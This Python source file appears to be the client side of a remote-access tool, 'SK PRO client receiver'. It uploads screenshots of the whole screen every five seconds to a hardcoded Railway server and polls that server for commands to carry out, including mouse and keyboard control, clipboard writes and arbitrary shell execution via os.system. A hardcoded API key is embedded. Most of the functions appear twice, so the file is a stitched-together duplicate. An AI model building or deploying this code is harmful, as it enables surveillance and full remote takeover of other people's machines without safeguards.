"""
SK PRO - CLIENT RECEIVER
Heartbeat + Screenshot + Remote Control
With detailed logging for debugging
"""

import time
import threading
import base64
import json
import os
import sys
from io import BytesIO
from datetime import datetime
from PIL import ImageGrab
import requests
import pyautogui
import pyperclip

# ════════════════════════════════════════════════════════════════════
# LOGGING SETUP
# ════════════════════════════════════════════════════════════════════

LOG_FILE = os.path.join(os.path.expanduser("~"), "SK_PRO_CLIENT.log")

def log(msg, level="INFO"):
    """Log to both console and file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] [{level}] {msg}"
    print(log_msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_msg + "\n")
    except:
        pass

# ════════════════════════════════════════════════════════════════════
# CONFIG (Injected from Build EXE)
# ════════════════════════════════════════════════════════════════════

SERVER_URL = os.getenv("SERVER_URL", "https://sender-production-32bc.up.railway.app")
USER_API_KEY = os.getenv("USER_API_KEY", "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV")
USERNAME = os.getenv("USERNAME", "client_user")
HEARTBEAT_INTERVAL = 10  # Every 10 seconds (faster for testing)
SCREENSHOT_INTERVAL = 5  # Every 5 seconds

# ════════════════════════════════════════════════════════════════════
# HEADERS
# ════════════════════════════════════════════════════════════════════

HEADERS = {"x-api-key": USER_API_KEY}

# ════════════════════════════════════════════════════════════════════
# INITIALIZATION LOG
# ════════════════════════════════════════════════════════════════════

log("="*60)
log("SK PRO CLIENT RECEIVER STARTED", "START")
log(f"Server URL: {SERVER_URL}", "CONFIG")
log(f"Username: {USERNAME}", "CONFIG")
log(f"User API Key: {USER_API_KEY[:20]}...", "CONFIG")
log(f"Heartbeat Interval: {HEARTBEAT_INTERVAL}s", "CONFIG")
log(f"Screenshot Interval: {SCREENSHOT_INTERVAL}s", "CONFIG")
log("="*60)

# ════════════════════════════════════════════════════════════════════
# HEARTBEAT - Keep client online and registered
# ════════════════════════════════════════════════════════════════════

def send_heartbeat():
    """Send heartbeat to keep client online and register in Live Monitor"""
    log("Heartbeat thread started", "THREAD")
    
    while True:
        try:
            payload = {
                "username": USERNAME,
                "timestamp": time.time(),
                "status": "online"
            }
            
            log(f"Sending heartbeat for user: {USERNAME}", "HEARTBEAT")
            
            resp = requests.post(
                f"{SERVER_URL}/api/user/heartbeat",
                json=payload,
                headers=HEADERS,
                timeout=5
            )
            
            if resp.status_code == 200:
                log(f"✅ Heartbeat SUCCESS (200) - User {USERNAME} is ONLINE", "SUCCESS")
                try:
                    data = resp.json()
                    log(f"   Response: {data}", "SUCCESS")
                except:
                    pass
            else:
                log(f"❌ Heartbeat FAILED ({resp.status_code}) - {resp.text[:100]}", "ERROR")
        
        except requests.exceptions.ConnectionError as e:
            log(f"❌ Connection Error: {str(e)[:100]}", "ERROR")
        except requests.exceptions.Timeout as e:
            log(f"❌ Timeout Error: {str(e)[:100]}", "ERROR")
        except Exception as e:
            log(f"❌ Heartbeat exception: {str(e)[:100]}", "ERROR")
        
        log(f"Next heartbeat in {HEARTBEAT_INTERVAL}s...", "INFO")
        time.sleep(HEARTBEAT_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# SCREENSHOT - Capture and upload
# ════════════════════════════════════════════════════════════════════

def take_screenshot_base64():
    """Capture screenshot and convert to base64"""
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        img_base64 = base64.b64encode(buffer.getvalue()).decode()
        log(f"📸 Screenshot captured ({len(img_base64)} bytes base64)", "SCREENSHOT")
        return img_base64
    except Exception as e:
        log(f"❌ Screenshot capture error: {str(e)[:100]}", "ERROR")
        return None

def send_screenshot():
    """Send screenshot to server"""
    log("Screenshot thread started", "THREAD")
    
    while True:
        try:
            img_base64 = take_screenshot_base64()
            
            if img_base64:
                payload = {
                    "username": USERNAME,
                    "image_base64": img_base64,
                    "timestamp": time.time()
                }
                
                log(f"Uploading screenshot for user: {USERNAME}", "SCREENSHOT")
                
                resp = requests.post(
                    f"{SERVER_URL}/api/user/screenshot",
                    json=payload,
                    headers=HEADERS,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    log(f"✅ Screenshot uploaded SUCCESS (200)", "SUCCESS")
                else:
                    log(f"❌ Screenshot upload FAILED ({resp.status_code})", "ERROR")
        
        except Exception as e:
            log(f"❌ Screenshot error: {str(e)[:100]}", "ERROR")
        
        time.sleep(SCREENSHOT_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# COMMANDS - Check and execute
# ════════════════════════════════════════════════════════════════════

def check_commands():
    """Check for pending commands from admin"""
    log("Commands thread started", "THREAD")
    
    while True:
        try:
            resp = requests.get(
                f"{SERVER_URL}/api/user/commands?username={USERNAME}",
                headers=HEADERS,
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                commands = data.get("commands", [])
                
                if commands:
                    log(f"📦 Received {len(commands)} pending commands", "COMMANDS")
                    for cmd in commands:
                        execute_command(cmd)
        
        except Exception as e:
            log(f"❌ Command check error: {str(e)[:100]}", "ERROR")
        
        time.sleep(10)

def execute_command(cmd):
    """Execute command from admin"""
    cmd_id = cmd["id"]
    command = cmd["command"]
    args = cmd.get("args", "")
    
    try:
        log(f"Executing command: {command} (id: {cmd_id})", "COMMANDS")
        
        if command == "mouse":
            # Format: x,y,action
            parts = args.split(",")
            if len(parts) >= 3:
                x, y, action = int(parts[0]), int(parts[1]), parts[2]
                
                if action == "move":
                    pyautogui.moveTo(x, y)
                elif action == "click":
                    pyautogui.click(x, y)
                elif action == "drag":
                    pyautogui.moveTo(x, y)
                    pyautogui.drag(100, 100)
                
                log(f"✅ Mouse {action} at ({x}, {y})", "COMMANDS")
        
        elif command == "keyboard":
            # Format: key,action
            parts = args.split(",")
            if len(parts) >= 2:
                key = parts[0]
                action = parts[1]
                
                if action == "press":
                    pyautogui.press(key)
                elif action == "hold":
                    pyautogui.keyDown(key)
                elif action == "release":
                    pyautogui.keyUp(key)
                
                log(f"✅ Keyboard {action}: {key}", "COMMANDS")
        
        elif command == "clipboard":
            # Set clipboard
            pyperclip.copy(args)
            log(f"✅ Clipboard set", "COMMANDS")
        
        elif command == "execute":
            # Execute shell command
            os.system(args)
            log(f"✅ Executed: {args}", "COMMANDS")
        
        # Acknowledge command
        ack_command(cmd_id)
    
    except Exception as e:
        log(f"❌ Command execution error: {str(e)[:100]}", "ERROR")

def ack_command(cmd_id):
    """Acknowledge command execution"""
    try:
        resp = requests.post(
            f"{SERVER_URL}/api/user/command-ack?cmd_id={cmd_id}",
            headers=HEADERS,
            timeout=5
        )
        if resp.status_code == 200:
            log(f"✅ Command {cmd_id} acknowledged", "COMMANDS")
    except Exception as e:
        log(f"❌ ACK error: {str(e)[:100]}", "ERROR")

# ════════════════════════════════════════════════════════════════════
# MAIN - Start all threads
# ════════════════════════════════════════════════════════════════════

def main():
    """Start client receiver"""
    log(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                  SK PRO CLIENT RECEIVER v4.2                              ║
║                   🟢 ONLINE - Ready for Remote Control                    ║
╚════════════════════════════════════════════════════════════════════════════╝

Server: {SERVER_URL}
User: {USERNAME}
Status: RUNNING

Threads:
├─ Heartbeat: Every {HEARTBEAT_INTERVAL}s (Register + Keep Online)
├─ Screenshot: Every {SCREENSHOT_INTERVAL}s (Live View)
└─ Commands: Every 10s (Remote Control)

Logs: {LOG_FILE}

To stop: Close this window or press Ctrl+C
    """, "START")
    
    # Start daemon threads
    threading.Thread(target=send_heartbeat, daemon=True).start()
    threading.Thread(target=send_screenshot, daemon=True).start()
    threading.Thread(target=check_commands, daemon=True).start()
    
    log("All threads started successfully", "START")
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("❌ Client stopped by user", "STOP")
        sys.exit(0)

if __name__ == "__main__":
    main()

# ════════════════════════════════════════════════════════════════════
# SCREENSHOT - Capture and upload
# ════════════════════════════════════════════════════════════════════

def take_screenshot_base64():
    """Capture screenshot and convert to base64"""
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        img_base64 = base64.b64encode(buffer.getvalue()).decode()
        return img_base64
    except Exception as e:
        print(f"❌ Screenshot error: {str(e)[:50]}")
        return None

def send_screenshot():
    """Send screenshot to server"""
    while True:
        try:
            img_base64 = take_screenshot_base64()
            
            if img_base64:
                payload = {
                    "username": USERNAME,
                    "image_base64": img_base64,
                    "timestamp": time.time()
                }
                
                resp = requests.post(
                    f"{SERVER_URL}/api/user/screenshot",
                    json=payload,
                    headers=HEADERS,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    print(f"✅ Screenshot uploaded")
                else:
                    print(f"❌ Screenshot upload failed: {resp.status_code}")
        
        except Exception as e:
            print(f"❌ Screenshot error: {str(e)[:50]}")
        
        time.sleep(SCREENSHOT_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# COMMANDS - Check and execute
# ════════════════════════════════════════════════════════════════════

def check_commands():
    """Check for pending commands from admin"""
    while True:
        try:
            resp = requests.get(
                f"{SERVER_URL}/api/user/commands?username={USERNAME}",
                headers=HEADERS,
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                commands = data.get("commands", [])
                
                for cmd in commands:
                    execute_command(cmd)
        
        except Exception as e:
            print(f"❌ Command check error: {str(e)[:50]}")
        
        time.sleep(10)

def execute_command(cmd):
    """Execute command from admin"""
    cmd_id = cmd["id"]
    command = cmd["command"]
    args = cmd.get("args", "")
    
    try:
        if command == "mouse":
            # Format: x,y,action
            parts = args.split(",")
            if len(parts) >= 3:
                x, y, action = int(parts[0]), int(parts[1]), parts[2]
                
                if action == "move":
                    pyautogui.moveTo(x, y)
                elif action == "click":
                    pyautogui.click(x, y)
                elif action == "drag":
                    pyautogui.moveTo(x, y)
                    pyautogui.drag(100, 100)
                
                print(f"✅ Mouse command executed: {action} at ({x}, {y})")
        
        elif command == "keyboard":
            # Format: key,action
            parts = args.split(",")
            if len(parts) >= 2:
                key = parts[0]
                action = parts[1]
                
                if action == "press":
                    pyautogui.press(key)
                elif action == "hold":
                    pyautogui.keyDown(key)
                elif action == "release":
                    pyautogui.keyUp(key)
                
                print(f"✅ Keyboard command executed: {action} key {key}")
        
        elif command == "clipboard":
            # Set clipboard
            pyperclip.copy(args)
            print(f"✅ Clipboard set")
        
        elif command == "execute":
            # Execute shell command
            os.system(args)
            print(f"✅ Command executed: {args}")
        
        # Acknowledge command
        ack_command(cmd_id)
    
    except Exception as e:
        print(f"❌ Command execution error: {str(e)[:50]}")

def ack_command(cmd_id):
    """Acknowledge command execution"""
    try:
        resp = requests.post(
            f"{SERVER_URL}/api/user/command-ack?cmd_id={cmd_id}",
            headers=HEADERS,
            timeout=5
        )
        if resp.status_code == 200:
            print(f"✅ Command {cmd_id} acknowledged")
    except Exception as e:
        print(f"❌ ACK error: {str(e)[:50]}")

# ════════════════════════════════════════════════════════════════════
# MAIN - Start all threads
# ════════════════════════════════════════════════════════════════════

def main():
    """Start client receiver"""
    print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                  SK PRO CLIENT RECEIVER v4.2                              ║
║                   🟢 ONLINE - Ready for Remote Control                    ║
╚════════════════════════════════════════════════════════════════════════════╝

Server: {SERVER_URL}
User: {USERNAME}
Status: RUNNING

Threads:
├─ Heartbeat: Every {HEARTBEAT_INTERVAL}s (Keep Online)
├─ Screenshot: Every {SCREENSHOT_INTERVAL}s (Live View)
└─ Commands: Every 10s (Remote Control)
    """)
    
    # Start daemon threads
    threading.Thread(target=send_heartbeat, daemon=True).start()
    threading.Thread(target=send_screenshot, daemon=True).start()
    threading.Thread(target=check_commands, daemon=True).start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n❌ Client stopped")

if __name__ == "__main__":
    main()

